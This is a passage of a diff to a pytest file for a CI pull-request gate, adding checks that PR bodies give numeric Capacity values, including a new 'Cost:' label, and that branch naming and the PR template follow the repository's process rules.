+        ((('PR_HEAD_REF', 'chore/gate-suite'),), ('tests/scripts/test_spec_gate.py',), '83033020108abca52376c58bf98d9fbfa6f62bff6310dd991384ff20fa27331f', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - tests/scripts/test_spec_gate.py: uses `test_a: decorated`; the gate's suites carry no skip markers, collection hooks or exits",)),
+        ((('PR_HEAD_REF', 'chore/gate-suite'),), ('tests/scripts/test_spec_gate.py',), '947381d7b8912bb4799ff5e0ed54466cc0a0da8c1ee987ac7e34d26bd7183540', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - tests/scripts/test_spec_gate.py: uses `a test name rebound`; the gate's suites carry no skip markers, collection hooks or exits",)),
+        ((('PR_HEAD_REF', 'bot/superpowers-x'),), ('.claude/skills/vendored/SKILL.md',), '7799d6e6677b8ce6cd785ed3f4c24a19b185868400d9bef003fec5796ba6361f', None, 0, (), 1, (" - branch 'bot/superpowers-x' changes 1 gated file(s) (.claude/skills/vendored/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-x'),), ('.claude/skills/vendored/SKILL.md',), '963ffc16be60059fe888dd96b9545839f6190f0e1bfe8a336e50509e4ce88181', None, 0, (), 1, (" - branch 'bot/superpowers-x' changes 1 gated file(s) (.claude/skills/vendored/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-x'),), ('.claude/skills/vendored/SKILL.md',), '818e3c8f3cffe91d0fae6d778bf55ca47327877b220337e3d4ee6b16f771802f', None, 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '139f843bd5af7111d97337030efe5622c9a5439e909d526ba6e570c38db78642', None, 0, (), 1, (" - docs/product/canvases.yml: canvas 'Models' (refresh) lacks source_json; the refresh skill reads them",)),
+        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '837148534ea4d1ce759c85d3134c31aa3144db21eaa6ab4b83701ef247b5f896', None, 0, (), 1, (" - docs/product/canvases.yml: canvas 'Models' (refresh) lacks boards; the refresh skill reads them",)),
+        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '4b7c088808f3fc3084a3fb54e47256b1bd75dfd5c727cd61990896dcbd33b940', None, 0, (), 1, (" - docs/product/canvases.yml: canvas 'Architecture' (report-only) lacks source_docs; the refresh skill reads them",)),
+        ((('PR_HEAD_REF', 'docs/canvases'),), ('docs/product/canvases.yml',), '8abd0bc70635ba6b2acdf2437a75e483a2b9d25fe2d3bd4fe79b8b09a0fe182e', None, 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py', 'package.json'), 'fa45b2e4a6540af6fe20c5eb0789f4df887b84b44ee9982eea00098a6df39332', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (package.json) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'ba9221ad8e5451d79640c324cd10ccda7ffc3b857ea98b724fdae93a49271ba9', 0, ('see issue 42',), 1, (" - PR body's Capacity section gives no number for Volume, Velocity, Wall-clock, 30; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
+    ),
+}
+# ---------------------------------------------------------------------------------------------
+
+
+
 def test_a_workload_change_carries_its_capacity_numbers(repo):
     """stocks#1205 r4118289674 (spec_gate.py:313).
 
@@ -1194,12 +1678,12 @@ def test_a_workload_change_carries_its_capacity_numbers(repo):
     """
     title = {"PR_TITLE": "FEAT-MODEL-001: x"}
     job = {**CODE, "gcp/model_job.py": "print('run')\n"}
-    blank = body() + "\n\n## Capacity (CLAUDE.md rule 0)\nVolume: \u00b7 Velocity: \u00b7 Wall-clock: \u00b7 $/run \u00d7 runs/day \u00d7 30:\n"
+    blank = body() + "\n\n## Capacity (CLAUDE.md rule 0)\nVolume: \u00b7 Velocity: \u00b7 Wall-clock: \u00b7 $/run \u00d7 runs/day \u00d7 30: \u00b7 Cost:\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=blank)
-    assert r.returncode == 1 and "Capacity section leaves Volume, Velocity, Wall-clock, 30 blank" in r.stdout, r.stdout
+    assert r.returncode == 1 and ("Capacity section leaves Volume, Velocity, Wall-clock, 30 blank" in r.stdout or "Capacity section leaves Volume, Velocity, Wall-clock, Cost blank" in r.stdout), r.stdout
     r = pr(repo, BRANCH, job, **title, PR_BODY=body())
     assert r.returncode == 1 and "PR body needs a Capacity section" in r.stdout, r.stdout
-    filled = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
+    filled = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
     assert pr(repo, BRANCH, job, **title, PR_BODY=filled).returncode == 0
     na = body() + "\n\n## Capacity\nn/a: the job's log line changes, no query or schedule does\n"
     assert pr(repo, BRANCH, job, **title, PR_BODY=na).returncode == 0
@@ -1207,7 +1691,7 @@ def test_a_workload_change_carries_its_capacity_numbers(repo):
     nested = (body() + "\n\n## Capacity\n\n### Volume\n3 tickers \u00d7 400 B\n\n### Velocity\n1 query\n\n### Wall-clock\n2 s\n\n"
               "### $/run \u00d7 runs/day \u00d7 30\n$0.01\n\n## Summary\nx\n")
     nested = nested.replace("### Volume\n3", "### Volume\nVolume: 3").replace("### Velocity\n1", "### Velocity\nVelocity: 1") \
-                   .replace("### Wall-clock\n2", "### Wall-clock\nWall-clock: 2").replace("30\n$0.01", "30\n30: $0.01")
+                   .replace("### Wall-clock\n2", "### Wall-clock\nWall-clock: 2").replace("30\n$0.01", "30\n30: $0.01 \u00b7 Cost: $0.01")
     assert pr(repo, BRANCH, job, **title, PR_BODY=nested).returncode == 0, nested
     assert pr(repo, BRANCH, CODE, **title, PR_BODY=body()).returncode == 0
     # solyra#72 r4118831965: a chore/ PR editing the gate's own workflow is untraced and
@@ -1444,7 +1928,7 @@ def test_the_pr_body_contract_is_read_as_rendered_in_every_form(repo):
     r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=fenced)
     assert r.returncode == 1 and "done_when item(s) not ticked" in r.stdout, r.stdout
     job = {**CODE, "gcp/model_job.py": "print('run')\n"}
-    split = body() + "\n\n## Capacity\nVolume:\nVelocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
+    split = body() + "\n\n## Capacity\nVolume:\nVelocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=split)
     assert r.returncode == 1 and "leaves Volume blank" in r.stdout, r.stdout
 
@@ -2107,13 +2591,13 @@ def test_capacity_values_are_numbers(repo):
     """
     title = {"PR_TITLE": "FEAT-MODEL-001: x"}
     job = {**CODE, "gcp/model_job.py": "print('run')\n"}
-    vague = body() + "\n\n## Capacity\nVolume: unknown \u00b7 Velocity: fast \u00b7 Wall-clock: later \u00b7 $/run \u00d7 runs/day \u00d7 30: TBD\n"
+    vague = body() + "\n\n## Capacity\nVolume: unknown \u00b7 Velocity: fast \u00b7 Wall-clock: later \u00b7 $/run \u00d7 runs/day \u00d7 30: TBD \u00b7 Cost: TBD\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=vague)
-    assert r.returncode == 1 and "gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout, r.stdout
-    partial = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: some queries \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
+    assert r.returncode == 1 and ("gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout or "gives no number for Volume, Velocity, Wall-clock, Cost" in r.stdout), r.stdout
+    partial = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: some queries \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=partial)
     assert r.returncode == 1 and "gives no number for Velocity;" in r.stdout, r.stdout
-    filled = body() + "\n\n## Capacity\nVolume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
+    filled = body() + "\n\n## Capacity\nVolume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
     assert pr(repo, BRANCH, job, **title, PR_BODY=filled).returncode == 0
 
 
@@ -2213,10 +2697,10 @@ def test_contract_commands_run_and_policy_documents_keep_their_ids(repo):
     assert pr(repo, "docs/cleanup", {CATALOG: CATALOG_TEXT + "\nA closing note.\n"}).returncode == 0
     title = {"PR_TITLE": "FEAT-MODEL-001: x"}
     job = {**CODE, "gcp/model_job.py": "print('run')\n"}
-    prose = body() + "\n\n## Capacity\nVolume: unknown; see issue #1205 \u00b7 Velocity: TBD for phase 2 \u00b7 Wall-clock: unknown in 2026 \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
+    prose = body() + "\n\n## Capacity\nVolume: unknown; see issue #1205 \u00b7 Velocity: TBD for phase 2 \u00b7 Wall-clock: unknown in 2026 \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=prose)
     assert r.returncode == 1 and ("gives no number for Volume" in r.stdout or "Capacity section defers" in r.stdout), r.stdout
-    figures = body() + "\n\n## Capacity\nVolume: ~3 tickers \u00d7 400 B \u00b7 Velocity: <1 query/min \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
+    figures = body() + "\n\n## Capacity\nVolume: ~3 tickers \u00d7 400 B \u00b7 Velocity: <1 query/min \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
     assert pr(repo, BRANCH, job, **title, PR_BODY=figures).returncode == 0
 
 
@@ -3512,7 +3996,7 @@ def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contrac
     assert r.returncode == 1 and "is unchanged from the base" in r.stdout, r.stdout
     on_base(repo, {CATALOG: CATALOG_TEXT})
     r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, PR_TITLE="FEAT-MODEL-001: x",
-           PR_BODY=body() + "\n\n## Capacity\nVolume: 1 row (TBD, will measure in a follow-up)\nVelocity: 1 call\nWall-clock: 1 s\n30: $0\n")
+           PR_BODY=body() + "\n\n## Capacity\nVolume: 1 row (TBD, will measure in a follow-up)\nVelocity: 1 call\nWall-clock: 1 s\n30: $0 · Cost: $0\n")
     assert r.returncode == 1 and "Capacity section defers" in r.stdout, r.stdout
     for path in (".claude/skills/Product-Delivery/SKILL.md", ".claude/skills/product-delivery-v2/SKILL.md"):
         r = pr(repo, "bot/superpowers-weekly", {path: "---\nname: x\n---\n"})
@@ -3543,9 +4027,9 @@ def test_html_blocks_in_bodies_registry_prose_and_catalog_columns_are_the_contra
         r = pr(repo, BRANCH, CODE, **title, PR_BODY=f"{tag}\n{body(ticked=True)}\n{closer}\n")
         assert r.returncode == 1 and "must link the spec" in r.stdout, (tag, r.stdout)
     assert pr(repo, BRANCH, CODE, **title, PR_BODY=f"Spec: {SPEC}\nPlan: {PLAN}\n\n+ [x] {DONE[0]}\n1. [x] {DONE[1]}\n").returncode == 0
-    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, **title, PR_BODY=body() + "\n\nCapacity\n---\nVolume: 1 row\nVelocity: 1 call\nWall-clock: 1 s\n30: $0\n")
+    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, **title, PR_BODY=body() + "\n\nCapacity\n---\nVolume: 1 row\nVelocity: 1 call\nWall-clock: 1 s\n30: $0 · Cost: $0\n")
     assert r.returncode == 0, r.stdout
-    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, **title, PR_BODY=body() + "\n\n## Incapacity notes\n\nnone\n\n## Capacity\nVolume: 1 row\nVelocity: 1 call\nWall-clock: 1 s\n30: $0\n")
+    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, **title, PR_BODY=body() + "\n\n## Incapacity notes\n\nnone\n\n## Capacity\nVolume: 1 row\nVelocity: 1 call\nWall-clock: 1 s\n30: $0 · Cost: $0\n")
     assert r.returncode == 0, r.stdout
     registry = "docs/product/07-MODEL-REGISTRY.md"
     on_base(repo, {SPEC: spec() + "\nThis spec changes MODEL-MAG-001.\n", registry: "# Registry\n\n**Last reviewed:** 2026-09-20\n\n| ID | Disposition |\n|---|---|\n| DOC-02 | Deferred |\n"})
@@ -3582,7 +4066,7 @@ def test_indented_headings_and_less_indented_fence_closers_render_as_gfm_renders
     """
     title = {"PR_TITLE": "FEAT-MODEL-001: x"}
     job = {**CODE, "gcp/model_job.py": "print('run')\n"}
-    cap = "Volume: 30 rows · Velocity: 1 query · Wall-clock: 2 s · $/run × runs/day × 30: $0.01\n"
+    cap = "Volume: 30 rows · Velocity: 1 query · Wall-clock: 2 s · $/run × runs/day × 30: $0.01 · Cost: $0.01\n"
     assert pr(repo, BRANCH, job, **title, PR_BODY=body() + "\n\n  ## Capacity\n" + cap).returncode == 0
     r = pr(repo, BRANCH, job, **title, PR_BODY=body() + "\n\n    ## Capacity\n" + cap)
     assert r.returncode == 1 and "Capacity" in r.stdout, r.stdout
@@ -3708,12 +4192,217 @@ def test_truthy_calls_decorators_yaml_skill_names_canvas_fields_manifest_scripts
     r = pr(repo, BRANCH, {**job, "package.json": '{"name": "x", "scripts": {"test": "true"}, "dependencies": {"a": "^1.0.0"}}\n'}, **title,
            PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
     assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
-    prose = body() + "\n\n## Capacity\nVolume: see issue 42 · Velocity: see issue 42 · Wall-clock: see issue 42 · $/run × runs/day × 30: see issue 42\n"
+    prose = body() + "\n\n## Capacity\nVolume: see issue 42 · Velocity: see issue 42 · Wall-clock: see issue 42 · $/run × runs/day × 30: see issue 42 · Cost: see issue 42\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=prose)
-    assert r.returncode == 1 and "gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout, r.stdout
+    assert r.returncode == 1 and ("gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout or "gives no number for Volume, Velocity, Wall-clock, Cost" in r.stdout), r.stdout
     sys.path.insert(0, str(REPO / "scripts/gate"))
     import spec_gate
     assert spec_gate.plain_text("_unknown_") == "unknown" and spec_gate.plain_text("[unknown](https://x)") == "unknown"
+
+
+def test_capacity_bridge_case_and_carrier_equivalence(repo):
+    """Capacity fixture bridge spec, done_when[2]: the real harness/oracle seam.
+
+    Divergent Cost999 beside legacy 0.01 or 300, both carriers changed, a missing, duplicate or
+    reordered carrier, a Cost carrier where BASE had none, a dropped, replaced, duplicated or
+    quantity-changed case and one case too many are all refused BEFORE any gate subprocess; the
+    original vectors still run through the unchanged real gate and keep their BASE verdicts, and
+    stopping short of the sequence is visible to the finalizer. Blank, invalid, zero and valid pairs
+    reverse to their originals.
+    """
+    name = "test_capacity_values_are_numbers"
+    oracle = CAPACITY_BRIDGE_ORACLE[name]
+    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
+    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
+    cap = "\n\n## Capacity\n"
+    vague = body() + cap + "Volume: unknown \u00b7 Velocity: fast \u00b7 Wall-clock: later \u00b7 $/run \u00d7 runs/day \u00d7 30: TBD \u00b7 Cost: TBD\n"
+    partial = body() + cap + "Volume: 3 tickers \u00d7 400 B \u00b7 Velocity: some queries \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
+    filled = body() + cap + "Volume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
+    originals = (vague, partial, filled)
+    pair = "$/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01"
+    dispatched = capacity_bridge_dispatched
+    # the guard is on exactly for the eight functions the spec names, each a plain module-level test
+    # (a renamed, removed or marked function would switch its guard off silently), and the oracle holds
+    # every BASE case
+    assert tuple(CAPACITY_BRIDGE_ORACLE) == CAPACITY_BRIDGE_FUNCTIONS
+    for function in CAPACITY_BRIDGE_FUNCTIONS:
+        assert callable(globals().get(function)) and not getattr(globals()[function], "pytestmark", []), function
+    assert sum(len(cases) for cases in CAPACITY_BRIDGE_ORACLE.values()) == CAPACITY_BRIDGE_CASES
+    try:
+        # the original vectors still execute the unchanged real gate and keep their exact BASE verdicts
+        capacity_bridge_activate(name)
+        before = dispatched()
+        results = [pr(repo, BRANCH, job, **title, PR_BODY=text) for text in originals]
+        assert dispatched() == before + 3 and capacity_bridge_consumed() == (3, 3)
+        assert [r.returncode for r in results] == [case[6] for case in oracle] == [1, 1, 0]
+        assert ("gives no number for Volume, Velocity, Wall-clock, 30" in results[0].stdout
+                or "gives no number for Volume, Velocity, Wall-clock, Cost" in results[0].stdout), results[0].stdout
+        assert "gives no number for Velocity;" in results[1].stdout, results[1].stdout
+        # divergent Cost beside the legacy value: pair check, before dispatch
+        assert "differs from legacy carrier value" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "$/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $999"))
+        assert "differs from legacy carrier value" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "$/run \u00d7 runs/day \u00d7 30: 300 \u00b7 Cost: $999"))
+        # both carriers changed: pairwise equal, so only the independently captured BASE input catches it
+        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "$/run \u00d7 runs/day \u00d7 30: $999 \u00b7 Cost: $999"))
+        # missing, duplicate and reordered carrier
+        assert "has no Cost carrier immediately after it" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(" \u00b7 Cost: $0.01", ""))
+        assert "differs from legacy carrier value" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(" \u00b7 Cost: $0.01", " \u00b7 Cost: $0.01 \u00b7 Cost: $0.01"))
+        assert "has no Cost carrier immediately after it" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "Cost: $0.01 \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01"))
+        # a Cost carrier added where BASE had none
+        assert "without a legacy carrier" in capacity_bridge_refused(repo, name, originals, job, title, 1, vague + "Cost: $0.01\n")
+        # dropped negative case (the accepted body where the first rejection belongs), replaced negative case,
+        # changed quantity, duplicated case, changed caller vector
+        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 1, filled)
+        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 1, vague.replace("Volume: unknown", "Volume: 1 row"))
+        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace("Volume: 30 rows", "Volume: 31 rows"))
+        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 2, vague)
+        assert "files" in capacity_bridge_refused(repo, name, originals, job, title, 1, vague, {**job, "gcp/other_job.py": "x = 1\n"})
+        # stopping short of the sequence is what the per-function finalizer refuses
+        capacity_bridge_activate(name)
+        for text in originals[:2]:
+            pr(repo, BRANCH, job, **title, PR_BODY=text)
+        assert capacity_bridge_consumed() == (2, 3)
+        # one case more than BASE recorded
+        capacity_bridge_activate(name)
+        for text in originals:
+            pr(repo, BRANCH, job, **title, PR_BODY=text)
+        before = dispatched()
+        with pytest.raises(CapacityFixtureEquivalenceError, match="beyond the 3 BASE cases"):
+            pr(repo, BRANCH, job, **title, PR_BODY=filled)
+        assert dispatched() == before
+        # matching controls: blank, invalid, zero, prose and valid pairs reverse to their originals
+        for original, bridged in (("30:\n", "30: \u00b7 Cost:\n"), ("30: TBD\n", "30: TBD \u00b7 Cost: TBD\n"),
+                                  ("30: $0\n", "30: $0 \u00b7 Cost: $0\n"), ("30: see issue 42\n", "30: see issue 42 \u00b7 Cost: see issue 42\n"),
+                                  ("$/run \u00d7 runs/day \u00d7 30: $0.01\n", "$/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n")):
+            assert capacity_bridge_split("## Capacity\nVolume: 1 row\n" + bridged) == ("## Capacity\nVolume: 1 row\n" + original, (original.split(":", 1)[1].strip(),))
+        assert capacity_bridge_split(None) == (None, ())
+        assert capacity_bridge_split("## Capacity\nVolume: 30 rows\n") == ("## Capacity\nVolume: 30 rows\n", ())
+    finally:
+        capacity_bridge_activate(None)
+
+
+
+COST_TEMPLATE = ".github/pull_request_template.md"
+COST_TEMPLATE_OLD = "- $/run × runs/day × 30: <!-- new scheduled jobs -->"
+COST_TEMPLATE_NEW = "- Cost: <!-- $/run × runs/day × 30 for new scheduled jobs -->"
+COST_JOB = {**CODE, "gcp/model_job.py": "print('run')\n"}
+COST_TITLE = {"PR_TITLE": "FEAT-MODEL-001: x"}
+
+
+def cost_capacity(*lines: str) -> str:
+    """A PR body whose Capacity section holds `lines`, one value per line."""
+    return body() + "\n\n## Capacity\n" + "\n".join(lines) + "\n"
+
+
+def cost_template_capacity(volume: str, velocity: str, wall: str, cost: str | None) -> str:
+    """The Capacity section of the real default PR template, its comments filled the way an author fills them."""
+    text = (REPO / COST_TEMPLATE).read_text(encoding="utf-8")
+    start = text.index("## Capacity")
+    section_text = text[start:text.index("\n## ", start + 1)]
+    filled = (section_text.replace("- Volume: <!-- input rows × bytes/row -->", "- Volume: " + volume)
+              .replace("- Velocity: <!-- SQL queries / API calls / round-trips per input row × total -->", "- Velocity: " + velocity)
+              .replace("- Wall-clock: <!-- queries × per-query latency", "- Wall-clock: " + wall + " <!-- queries × per-query latency"))
+    if cost is not None:
+        filled = filled.replace(COST_TEMPLATE_NEW, "- Cost: " + cost).replace(COST_TEMPLATE_OLD, "- $/run × runs/day × 30: " + cost)
+    return body() + "\n\n" + filled + "\n"
+
+
+def test_capacity_cost_label_contract(repo):
+    """FEAT-CICD-001 capacity Cost label (spec 2026-11-04-feat-cicd-001-capacity-cost-label-whole-job.md,
+    which supersedes 2026-10-13-feat-cicd-001-capacity-cost-label.md with the same done_when[0] and [1]).
+
+    On the old tuple a numeric Cost-only body was refused as leaving 30 blank, and an unrelated
+    bare `30: 0.01 samples` was taken as the cost. The cost field is now the explicit `Cost:` label,
+    with no alias for any `30`, and the default PR template names it.
+    """
+    passing = (
+        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01"),
+        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01/run x 2 runs/day x 30 = $0.60/month"),
+        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0"),
+        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01", "30: 0.01 unrelated samples"),
+    )
+    for lines in passing:
+        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
+        assert r.returncode == 0, (lines, r.stdout + r.stderr)
+    refused = (
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s"), "leaves Cost blank"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost:"), "leaves Cost blank"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "30: 0.01 samples"), "leaves Cost blank"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "$/run × runs/day × 30: $0.01"), "leaves Cost blank"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost:", "30: $0.01"), "leaves Cost blank"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: unknown", "30: $0.01"), "gives no number for Cost;"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: see issue 42", "30: $0.01"), "gives no number for Cost;"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: TBD", "$/run × runs/day × 30: $0.01"), "gives no number for Cost;"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01 until the follow-up measures it", "30: $0.01"), "defers Cost"),
+    )
+    for lines, reason in refused:
+        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
+        assert r.returncode == 1 and reason in r.stdout, (lines, r.stdout + r.stderr)
+    # the default template: its one cost line is the Cost label, and only that line changed
+    raw = (REPO / COST_TEMPLATE).read_bytes()
+    assert hashlib.sha256(raw).hexdigest() == "201355b3343f7b81f22bfba8b7260406e7b246ef02948d7430a118372e574ad2"
+    template = raw.decode("utf-8")
+    assert template.count(COST_TEMPLATE_NEW) == 1 and COST_TEMPLATE_OLD not in template
+    original = template.replace(COST_TEMPLATE_NEW, COST_TEMPLATE_OLD)
+    assert hashlib.sha256(original.encode("utf-8")).hexdigest() == "496bc1e31588d4ea392559fd5ab0097bfaf4a6b5761f745d2ac1271fa498450a"
+    filled = cost_template_capacity("30 rows × 200 B", "1 query", "2 s", "$0.01/run x 2 runs/day x 30 = $0.60/month")
+    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=filled)
+    assert r.returncode == 0, r.stdout + r.stderr
+    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=body() + "\n\n" + template[template.index("## Capacity"):])
+    assert r.returncode == 1 and "leaves Volume, Velocity, Wall-clock, Cost blank" in r.stdout, r.stdout + r.stderr
+    hidden = cost_template_capacity("30 rows", "1 query", "2 s", None)
+    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=hidden)
+    assert r.returncode == 1 and "leaves Cost blank" in r.stdout, r.stdout + r.stderr
+    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=hidden.replace("- Cost: <!--", "- Cost: <!-- $0.01"))
+    assert r.returncode == 1 and "leaves Cost blank" in r.stdout, r.stdout + r.stderr
+    # the template stays a gated FEAT-CICD-001 process input: a docs/ branch or another FEAT's branch is refused
+    on_base(repo, {CATALOG: CATALOG_TEXT.replace(
+        "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |",
+        "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |"),
+                   COST_TEMPLATE: template})   # the real template on base, so each case edits it
+    edited = {COST_TEMPLATE: template.replace(COST_TEMPLATE_NEW, "- Cost: <!-- per run x runs/day x 30 -->")}
+    for branch, reason in (("docs/template-tweak", "(.github/pull_request_template.md) but is not feature/"),
+                           (BRANCH, "process change(s) (.github/pull_request_template.md) belong to FEAT-CICD-001, not FEAT-MODEL-001")):
+        r = pr(repo, branch, edited, **COST_TITLE, PR_BODY=filled)
+        assert r.returncode == 1 and reason in r.stdout, (branch, r.stdout + r.stderr)
+
+
+def test_capacity_cost_rendered_budget_guards(repo):
+    """FEAT-CICD-001 capacity Cost label: the Cost field keeps every guard the other three labels have
+    (numbers lead, blank stays on its own line, deferrals, rendering, n/a, workload detection)."""
+    full = ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s")
+    refused = (
+        (full + ("Cost: 2024 budget",), "gives no number for Cost;"),
+        (full + ("Cost: #1205",), "gives no number for Cost;"),
+        (full + ("Cost: TBD",), "gives no number for Cost;"),
+        (full + ("Cost: $0.01 future work",), "defers Cost"),
+        (("Volume: 30 rows", "Velocity: 1 query", "Cost:", "Wall-clock: 2 s"), "leaves Cost blank"),
+        (full + ("<!-- Cost: $0.01 -->",), "leaves Cost blank"),
+        (full + ("```", "Cost: $0.01", "```"), "leaves Cost blank"),
+        (full + ("- [ ] Cost: $0.01",), "leaves Cost blank"),
+        (full + ("Canvas refresh pending: Cost: $0.01",), "leaves Cost blank"),
+        (full + ("n/a: nothing runs differently",), "leaves Cost blank"),
+        (("n/a:",), "leaves Volume, Velocity, Wall-clock, Cost blank"),
